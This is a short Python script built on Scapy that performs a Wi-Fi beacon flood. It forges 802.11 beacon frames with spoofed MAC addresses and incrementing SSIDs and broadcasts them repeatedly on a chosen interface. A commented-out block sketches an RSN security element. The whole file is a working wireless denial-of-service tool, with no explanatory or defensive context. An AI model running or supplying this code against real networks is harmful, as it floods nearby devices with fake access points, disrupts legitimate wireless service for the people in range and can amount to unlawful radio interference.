from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump
import sys
import re

def hex_to_mac(hex_val):
    v = hex_val
    s = '{0:016x}'.format(v)
    s = ':'.join(re.findall(r'\w\w', s))
    return s

def beacon_flood(dev):
    iface = dev
    SSID = 'aaaaaaaaaa'
    hex_val = 0x000e96a001064d60
    idx = 0
    cnt = 0

    while idx < 10:
        SSID = SSID[:idx] + chr(ord(SSID[idx])+1) + SSID[idx+1:]
        addr = hex_to_mac(hex_val)

        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=addr, addr3=addr)
        beacon = Dot11Beacon(cap=0o411)
        essid = Dot11Elt(ID='SSID',info=SSID, len=len(SSID))
        """
        rsn = Dot11Elt(ID=48, info=(
        '\x01\x00'                 #RSN Version 1
        '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'         #AES Cipher
        '\x00\x0f\xac\x02'         #TKIP Cipher
        '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'         #Pre-Shared Key
        '\x00\x00'))               #RSN Capabilities (no extra capabilities)
        """
        frame = RadioTap()/dot11/beacon/essid
        sendp(frame, iface=iface, count=4)
        print(SSID)
        if SSID[idx] == 'z':
            idx += 1
        cnt += 1
print("[*] Beacon Flood Start")
beacon_flood(sys.argv[1])

